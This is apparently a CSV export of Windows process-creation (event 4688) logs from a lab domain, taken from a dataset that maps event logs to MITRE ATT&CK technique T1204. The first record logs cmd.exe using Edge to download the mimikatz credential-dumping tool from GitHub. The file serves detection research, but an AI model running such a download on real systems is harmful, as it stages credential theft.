RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
1,5999462,2022-01-06 22:27:21.2558595,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,6608,win10-02.offsec.lan,0,,A new process has been created,OFFSEC\admmig,,Parent process: C:\Windows\System32\cmd.exe,PID: 0x23A0,Parent PID: 0x1148,Mandatory label: SECURITY_MANDATORY_HIGH_RID,Target User: -\-,,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip ",False,EVTX-to-MITRE-Attack\TA0002-Execution\T1204-User execution\ID4688-Edge payload download via command.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x8E3563""},{""@Name"":""NewProcessId"",""#text"":""0x23A0""},{""@Name"":""NewProcessName"",""#text"":""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x1148""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip ""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-12288""}]}}"
2,5999467,2022-01-06 22:27:21.2889453,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,8520,win10-02.offsec.lan,0,,A new process has been created,OFFSEC\admmig,,Parent process: C:\Windows\System32\cmd.exe,PID: 0x1818,Parent PID: 0x1148,Mandatory label: SECURITY_MANDATORY_HIGH_RID,Target User: -\-,,"C:\Windows\System32\timeout.exe timeout  3 ",False,EVTX-to-MITRE-Attack\TA0002-Execution\T1204-User execution\ID4688-Edge payload download via command.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x8E3563""},{""@Name"":""NewProcessId"",""#text"":""0x1818""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\timeout.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x1148""},{""@Name"":""CommandLine"",""#text"":""timeout  3 ""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-12288""}]}}"
3,5999468,2022-01-06 22:27:21.4071807,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,8520,win10-02.offsec.lan,0,,A new process has been created,OFFSEC\admmig,,Parent process: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,PID: 0x1834,Parent PID: 0x23A0,Mandatory label: SECURITY_MANDATORY_HIGH_RID,Target User: -\-,,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data"" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data\Crashpad"" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=96.0.4664.110 ""--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --annotation=plat=Win64 ""--annotation=prod=Microsoft Edge"" --annotation=ver=96.0.1054.62 --initial-client-data=0xf0,0xf4,0xf8,0xa4,0xfc,0x7ffa3209a740,0x7ffa3209a750,0x7ffa3209a760",False,EVTX-to-MITRE-Attack\TA0002-Execution\T1204-User execution\ID4688-Edge payload download via command.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x8E3563""},{""@Name"":""NewProcessId"",""#text"":""0x1834""},{""@Name"":""NewProcessName"",""#text"":""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x23A0""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"" --type=crashpad-handler \""--user-data-dir=C:\\Users\\admmig\\AppData\\Local\\Microsoft\\Edge\\User Data\"" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler \""--database=C:\\Users\\admmig\\AppData\\Local\\Microsoft\\Edge\\User Data\\Crashpad\"" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=96.0.4664.110 \""--annotation=exe=C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"" --annotation=plat=Win64 \""--annotation=prod=Microsoft Edge\"" --annotation=ver=96.0.1054.62 --initial-client-data=0xf0,0xf4,0xf8,0xa4,0xfc,0x7ffa3209a740,0x7ffa3209a750,0x7ffa3209a760""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-12288""}]}}"
4,5999473,2022-01-06 22:27:21.7498267,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4676,win10-02.offsec.lan,0,,A new process has been created,OFFSEC\admmig,,Parent process: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,PID: 0x22AC,Parent PID: 0xD50,Mandatory label: SECURITY_MANDATORY_LOW_RID,Target User: -\-,,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --mojo-platform-channel-handle=5856 /prefetch:1",False,EVTX-to-MITRE-Attack\TA0002-Execution\T1204-User execution\ID4688-Edge payload download via command.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x8E3563""},{""@Name"":""NewProcessId"",""#text"":""0x22AC""},{""@Name"":""NewProcessName"",""#text"":""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0xD50""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --mojo-platform-channel-handle=5856 /prefetch:1""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-4096""}]}}"
5,5999474,2022-01-06 22:27:22.2192712,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,4676,win10-02.offsec.lan,0,,A new process has been created,OFFSEC\WIN10-02$,,Parent process: C:\Windows\System32\svchost.exe,PID: 0x21E8,Parent PID: 0x308,Mandatory label: SECURITY_MANDATORY_HIGH_RID,Target User: OFFSEC\admmig,,C:\Windows\System32\SecurityHealthHost.exe C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,False,EVTX-to-MITRE-Attack\TA0002-Execution\T1204-User execution\ID4688-Edge payload download via command.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""WIN10-02$""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E7""},{""@Name"":""NewProcessId"",""#text"":""0x21E8""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\SecurityHealthHost.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x308""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\System32\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""TargetUserName"",""#text"":""admmig""},{""@Name"":""TargetDomainName"",""#text"":""OFFSEC""},{""@Name"":""TargetLogonId"",""#text"":""0x8E3563""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-12288""}]}}"
6,5999479,2022-01-06 22:27:22.5136149,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,2416,win10-02.offsec.lan,0,,A new process has been created,OFFSEC\admmig,,Parent process: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,PID: 0x2840,Parent PID: 0xD50,Mandatory label: SECURITY_MANDATORY_LOW_RID,Target User: -\-,,"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=16 --mojo-platform-channel-handle=4376 /prefetch:1",False,EVTX-to-MITRE-Attack\TA0002-Execution\T1204-User execution\ID4688-Edge payload download via command.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x8E3563""},{""@Name"":""NewProcessId"",""#text"":""0x2840""},{""@Name"":""NewProcessName"",""#text"":""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0xD50""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=16 --mojo-platform-channel-handle=4376 /prefetch:1""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-4096""}]}}"
7,5999480,2022-01-06 22:27:24.1568271,4688,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,2416,win10-02.offsec.lan,0,,A new process has been created,OFFSEC\admmig,,Parent process: C:\Windows\System32\cmd.exe,PID: 0x2B5C,Parent PID: 0x1148,Mandatory label: SECURITY_MANDATORY_HIGH_RID,Target User: -\-,,"C:\Windows\System32\taskkill.exe taskkill  /IM ""msedge.exe"" /F",False,EVTX-to-MITRE-Attack\TA0002-Execution\T1204-User execution\ID4688-Edge payload download via command.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-4230534742-2542757381-3142984815-1111""},{""@Name"":""SubjectUserName"",""#text"":""admmig""},{""@Name"":""SubjectDomainName"",""#text"":""OFFSEC""},{""@Name"":""SubjectLogonId"",""#text"":""0x8E3563""},{""@Name"":""NewProcessId"",""#text"":""0x2B5C""},{""@Name"":""NewProcessName"",""#text"":""C:\\Windows\\System32\\taskkill.exe""},{""@Name"":""TokenElevationType"",""#text"":""%%1936""},{""@Name"":""ProcessId"",""#text"":""0x1148""},{""@Name"":""CommandLine"",""#text"":""taskkill  /IM \""msedge.exe\"" /F""},{""@Name"":""TargetUserSid"",""#text"":""S-1-0-0""},{""@Name"":""TargetUserName"",""#text"":""-""},{""@Name"":""TargetDomainName"",""#text"":""-""},{""@Name"":""TargetLogonId"",""#text"":""0x0""},{""@Name"":""ParentProcessName"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""MandatoryLabel"",""#text"":""S-1-16-12288""}]}}"
